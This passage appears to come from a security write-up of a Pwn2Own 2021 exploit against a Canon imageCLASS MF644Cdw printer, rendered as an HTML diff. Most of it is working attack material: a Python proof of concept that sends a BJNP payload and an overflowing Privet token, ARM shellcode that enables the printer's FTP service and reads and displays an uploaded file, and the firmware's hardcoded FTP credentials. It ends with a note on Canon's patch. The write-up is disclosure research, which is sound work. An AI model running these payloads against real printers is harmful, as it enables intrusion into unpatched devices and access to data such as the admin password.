+&lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.1.100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8610&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="n"&gt;bjnp_payloads&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromhex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;4FF0000045F2D84C44F2301CE0474FF000004EF6A031C4F2DE018E467047&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;store_payload&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bjnp_payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;privet_payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;privet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PrivetPayload&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ret_addr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x46F2B2B9&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;Content-type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;application/json&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;Accept&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;text/plain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+    &lt;span class="s2"&gt;&amp;quot;X-Privet-Token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privet_payload&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPConnection&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.1.100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/privet/register&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;cleanup_payload&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="payload"&gt;Payload&lt;/h1&gt;
+&lt;p&gt;We can now build upon this PoC to create a meaningful payload. As we want to display a custom image on screen, we need to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Find a way of uploading the image data (as we're limited to &lt;code&gt;0x180&lt;/code&gt; bytes in total in the BJNP session buffer),&lt;/li&gt;
+&lt;li&gt;Make sure the screen is turned on (for example, by disabling the energy save mode as above),&lt;/li&gt;
+&lt;li&gt;Call the display function with our image data to show it on screen.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="displaying-an-image"&gt;Displaying an image&lt;/h2&gt;
+&lt;p&gt;As the firmware contains a number of debug functions, we were able to understand the display mechanism rather quickly. There is  a function able to write an image into the frame buffer (located at &lt;code&gt;0x41305158&lt;/code&gt; in our firmware) which takes two arguments: the address of an RGB image, and the address of a frame buffer structure which looks like below:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;frame_buffer_struct&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;short&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;short&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;short&lt;/span&gt; &lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;short&lt;/span&gt; &lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The frame buffer can only be used to display &lt;code&gt;320x240&lt;/code&gt; pixels at a time which isn't enough to cover the whole screen as it is 800x480 pixels. We push this structure on the stack with the following code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;sub&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#8&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#320&lt;/span&gt;
+&lt;span class="nf"&gt;strh&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#4]  ; width&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#240&lt;/span&gt;
+&lt;span class="nf"&gt;strh&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#6]  ; height&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
+&lt;span class="nf"&gt;strh&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;      &lt;span class="c1"&gt;; x&lt;/span&gt;
+&lt;span class="nf"&gt;strh&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;sp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#2]  ; y&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Once this is done, assuming &lt;code&gt;r5&lt;/code&gt; contains the address of our image buffer, we display it on screen with the following code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;; Display frame buffer&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r5&lt;/span&gt;         &lt;span class="c1"&gt;; Image buffer&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;sp&lt;/span&gt;         &lt;span class="c1"&gt;; Frame buffer struct&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x5158&lt;/span&gt;
+&lt;span class="nf"&gt;movt&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x4130&lt;/span&gt;
+&lt;span class="nf"&gt;blx&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This leaves the question of the image buffer itself.&lt;/p&gt;
+&lt;h2 id="ftp"&gt;FTP&lt;/h2&gt;
+&lt;p&gt;Though we thought of multiple options to upload the image, we ended up deciding to use a legitimate feature of the printer: it can serve as an FTP server, which is disabled by default. Thus, we need to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Enable the &lt;code&gt;ftpd&lt;/code&gt; service,&lt;/li&gt;
+&lt;li&gt;Upload our image from the client,&lt;/li&gt;
+&lt;li&gt;Read the image in a buffer.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In our firmware, the function to enable the &lt;code&gt;ftpd&lt;/code&gt; service is located at &lt;code&gt;0x4185F664&lt;/code&gt; and takes 4 arguments: the maximum number of simultaneous client, the timeout, the command port, and the data port. It can be enabled with the following payload:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x3       ; Max clients&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x0       ; Timeout&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#21        ; Command port&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#20        ; Data port&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xF664&lt;/span&gt;
+&lt;span class="nf"&gt;movt&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x4185&lt;/span&gt;
+&lt;span class="nf"&gt;blx&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;ftpd&lt;/code&gt; service also has a feature to change directory. This doesn't really matter to us since the default directory is always &lt;code&gt;S:/&lt;/code&gt;. We could however decide to change it to: either access data stored on other paths (e.g. the admin password) or to ensure our exploit works correctly even if the directory was somehow changed beforehand. To do so, we would need to call the function at &lt;code&gt;0x4185E2A4&lt;/code&gt; with the &lt;code&gt;r0&lt;/code&gt; register set to the address of the new path string.&lt;/p&gt;
+&lt;p&gt;Once enabled, the FTP server requires credentials to connect. Fortunately for us, they are hardcoded in the firmware as &lt;code&gt;guest&lt;/code&gt; / &lt;code&gt;welcome.&lt;/code&gt;. We can upload our image (called &lt;code&gt;a&lt;/code&gt; in this example) with the following code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;ftplib&lt;/span&gt;
+
+&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;ftplib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FTP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;192.168.1.100&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;guest&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;welcome.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;ftp&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;image.raw&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+        &lt;span class="n"&gt;ftp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;storbinary&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;STOR a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="file-system"&gt;File system&lt;/h2&gt;
+&lt;p&gt;We are simply left with reading the image from the filesystem. Thankfully, DRYOS has an abstraction layer to handle this, allowing us to only look for the equivalent of the usual &lt;code&gt;open&lt;/code&gt;, &lt;code&gt;read&lt;/code&gt;, and &lt;code&gt;close&lt;/code&gt; functions. In our firmware, they are located respectively at &lt;code&gt;0x416917C8&lt;/code&gt;, &lt;code&gt;0x41691A20&lt;/code&gt;, and &lt;code&gt;0x41691878&lt;/code&gt;. Assuming &lt;code&gt;r5&lt;/code&gt; contains the address of our image path, we can open the file like so:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1C0&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r5&lt;/span&gt;         &lt;span class="c1"&gt;; Image path&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x17C8&lt;/span&gt;
+&lt;span class="nf"&gt;movt&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x4169&lt;/span&gt;
+&lt;span class="nf"&gt;blx&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;         &lt;span class="c1"&gt;; File handle&lt;/span&gt;
+
+&lt;span class="c1"&gt;; Exit if there was an error opening the file&lt;/span&gt;
+&lt;span class="nf"&gt;cmp&lt;/span&gt; &lt;span class="no"&gt;r5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
+&lt;span class="nf"&gt;ble&lt;/span&gt; &lt;span class="no"&gt;.end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The image being too large to store on the stack, we could decide to dynamically allocate a buffer. However, the firmware contains debug images stored in writable memory, so we decided to overwrite one of them instead to simplify the exploit. We went with &lt;code&gt;0x436A3F64&lt;/code&gt;, which originally contains a screenshot of a calculator.&lt;/p&gt;
+&lt;p&gt;Here is the payload to read the content of the file into this buffer:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;; Get address of image buffer&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x3F64&lt;/span&gt;
+&lt;span class="nf"&gt;movt&lt;/span&gt; &lt;span class="no"&gt;r10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x436A&lt;/span&gt;
+
+&lt;span class="c1"&gt;; Compute image size&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#320       ; Width&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#240       ; Height&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#3         ; Depth&lt;/span&gt;
+&lt;span class="nf"&gt;mul&lt;/span&gt; &lt;span class="no"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r2&lt;/span&gt;
+&lt;span class="nf"&gt;mul&lt;/span&gt; &lt;span class="no"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r3&lt;/span&gt;
+
+&lt;span class="c1"&gt;; Read content of file in buffer&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0         ; Bytes read&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r6&lt;/span&gt;         &lt;span class="c1"&gt;; Bytes left to read&lt;/span&gt;
+&lt;span class="nl"&gt;.loop:&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r4&lt;/span&gt;         &lt;span class="c1"&gt;; Number of bytes to read&lt;/span&gt;
+&lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="no"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r3&lt;/span&gt;    &lt;span class="c1"&gt;; Buffer position&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r5&lt;/span&gt;         &lt;span class="c1"&gt;; File handle&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1A20&lt;/span&gt;
+&lt;span class="nf"&gt;movt&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x4169&lt;/span&gt;
+&lt;span class="nf"&gt;blx&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;
+&lt;span class="nf"&gt;cmp&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
+&lt;span class="nf"&gt;ble&lt;/span&gt; &lt;span class="no"&gt;.end_read&lt;/span&gt;      &lt;span class="c1"&gt;; Exit in case of an error&lt;/span&gt;
+&lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="no"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;
+&lt;span class="nf"&gt;sub&lt;/span&gt; &lt;span class="no"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;
+&lt;span class="nf"&gt;cmp&lt;/span&gt; &lt;span class="no"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
+&lt;span class="nf"&gt;bgt&lt;/span&gt; &lt;span class="no"&gt;.loop&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;For completeness, here is how to close the file:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;r5&lt;/span&gt;
+&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x1878&lt;/span&gt;
+&lt;span class="nf"&gt;movt&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0x4169&lt;/span&gt;
+&lt;span class="nf"&gt;blx&lt;/span&gt; &lt;span class="no"&gt;r12&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="putting-everything-together"&gt;Putting everything together&lt;/h2&gt;
+&lt;p&gt;In the end, our exploit is split into 3 parts:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Execute a first payload to enable the &lt;code&gt;ftpd&lt;/code&gt; service and change to the &lt;code&gt;S:/&lt;/code&gt; directory,&lt;/li&gt;
+&lt;li&gt;Upload our image using FTP,&lt;/li&gt;
+&lt;li&gt;Exploit the vulnerability with another payload reading the image and displaying it on the screen.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;You can find the script handling all this in the &lt;a href="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/exploit"&gt;exploit folder&lt;/a&gt; and you can see the exploit in action &lt;a href="https://youtu.be/rY4phaf7KEU?t=4242"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;
+&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/rY4phaf7KEU?start=4242" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;
+&lt;/center&gt;&lt;/p&gt;
+&lt;p&gt;It feels a bit... Anticlimactic? Where is the &lt;a href="https://www.youtube.com/watch?v=5RS4myPuUn8"&gt;Doom port for DRYOS&lt;/a&gt; when you need it...&lt;/p&gt;
+&lt;h1 id="patch"&gt;Patch&lt;/h1&gt;
+&lt;p&gt;Canon published &lt;a href="https://www.usa.canon.com/internet/portal/us/home/support/product-advisories/detail/canon-laser-printer-inkjet-printer-and-small-office-multifunctional-printer-measure-against-buffer-overflow/"&gt;an advisory&lt;/a&gt; in March 2022 alongside a &lt;a href="https://cweb.canon.jp/drv-upd/satera-mfp/mf644cdw-firm-win.html"&gt;firmware update&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;A quick look at this new version shows that the &lt;code&gt;/privet&lt;/code&gt; endpoint is no longer reachable: the function registering this path now logs a message before simply exiting, and the &lt;code&gt;/privet&lt;/code&gt; string no longer appears in the binary. Despite this, it seems like the vulnerable code itself is still there - though it is now supposedly unreachable. Strings related to FTP have also been removed, hinting that Canon may have disabled this feature as well.&lt;/p&gt;
